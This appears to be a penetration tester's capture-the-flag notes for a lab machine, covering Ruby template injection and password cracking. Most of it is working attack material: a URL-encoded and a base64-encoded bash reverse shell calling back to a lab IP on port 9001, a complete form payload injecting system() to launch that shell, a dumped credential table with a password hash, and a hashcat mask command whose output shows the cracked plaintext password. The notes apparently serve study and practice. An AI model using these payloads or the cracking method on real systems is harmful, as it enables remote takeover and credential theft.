# Ruby SSTI

<%= system('cat /root/root.txt') %> <- returns true or false based on access using 'system'

bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.244%2F9001%200%3E%261

echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNDQvOTAwMSAwPiYx | base64 -d | bash <- base64 revshell

`find .ssh/ -type f -exec chmod 600 {} \;; find .ssh/ -type d -exec chmod 700 {} \;; find .ssh/ -type f -name "*.pub" -exec chmod 644 {} \;
`

`category1=1%0A<%25%3d+system('echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yNDQvOTAwMSAwPiYx+|+base64+-d+|+bash')+%25>&grade1=1&weight1=1&category2=2&grade2=2&weight2=1&category3=3&grade3=3&weight3=1&category4=4&grade4=4&weight4=1&category5=5&grade5=5&weight5=96
` <- complete SSTI for rev shell ruby

# SQLITE Db
cat pupilpath_credentials.db 
��^�ableusersusersCREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
a�\
Susan Miller
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f

https://www.dcode.fr/cipher-identifier

# cat /var/mail/susan

Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student

# Hashcat crack
hashcat -m 1400 ./susan.txt -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d --show
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210



